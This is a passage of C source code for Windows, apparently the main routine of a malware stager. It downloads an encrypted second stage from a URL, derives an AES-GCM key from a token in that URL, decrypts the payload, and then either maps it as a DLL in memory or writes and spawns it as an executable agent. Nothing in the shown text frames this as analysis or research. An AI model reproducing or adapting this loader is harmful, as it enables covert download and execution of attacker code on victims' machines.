    BYTE *resp = fetch_stage(wurl, &resp_len);
    if (!resp || resp_len == 0) {
        dbg("fetch failed\n");
        ExitProcess(4);
    }
    dbg("fetched\n");

    const char *ivb = NULL, *ctb = NULL;
    DWORD ivbn = 0, ctbn = 0;
    if (!json_span((const char *)resp, resp_len, "\"iv\"", &ivb, &ivbn) ||
        !json_span((const char *)resp, resp_len, "\"ct\"", &ctb, &ctbn)) {
        dbg("json span failed\n");
        ExitProcess(5);
    }
    dbg("spans ok\n");

    DWORD ivn = 0, ctn = 0;
    BYTE *iv = b64_decode(ivb, ivbn, &ivn);
    BYTE *ct = b64_decode(ctb, ctbn, &ctn);
    HeapFree(heap, 0, resp);
    if (!iv || !ct || ivn == 0 || ctn <= TAG_SIZE) {
        dbg("b64 failed\n");
        ExitProcess(6);
    }
    dbg("b64 ok\n");

    char token[160];
    char material[224];
    if (!token_from_url(url, token, sizeof(token))) {
        dbg("token failed\n");
        ExitProcess(7);
    }
    static const char prefix[] = "sp-stage|";
    DWORD plen = sizeof(prefix) - 1;
    DWORD tlen = slen(token);
    if (plen + tlen >= sizeof(material)) {
        dbg("token too long\n");
        ExitProcess(8);
    }
    memcpy(material, prefix, plen);
    memcpy(material + plen, token, tlen);
    BYTE key[32];
    if (!sha256((const BYTE *)material, plen + tlen, key)) {
        dbg("sha256 failed\n");
        ExitProcess(9);
    }

    DWORD plain_len = 0;
    BYTE *plain = gcm_open(key, iv, ivn, ct, ctn, &plain_len);
    HeapFree(heap, 0, iv);
    HeapFree(heap, 0, ct);
    if (!plain || plain_len == 0) {
        dbg("decrypt failed\n");
        ExitProcess(10);
    }
    dbg("decrypted\n");

    if (pe_is_dll(plain, plain_len)) {
        dbg("dll stage2\n");
        if (!run_mapped(plain, plain_len)) {
            dbg("map/run failed\n");
            ExitProcess(12);
        }
    }

    dbg("exe stage2\n");
    wchar_t path[MAX_PATH];
    if (!run_agent(plain, plain_len, path)) {
        dbg("run failed\n");
        ExitProcess(11);
    }
    HeapFree(heap, 0, plain);
    dbg("spawned\n");
    ExitProcess(0);
}
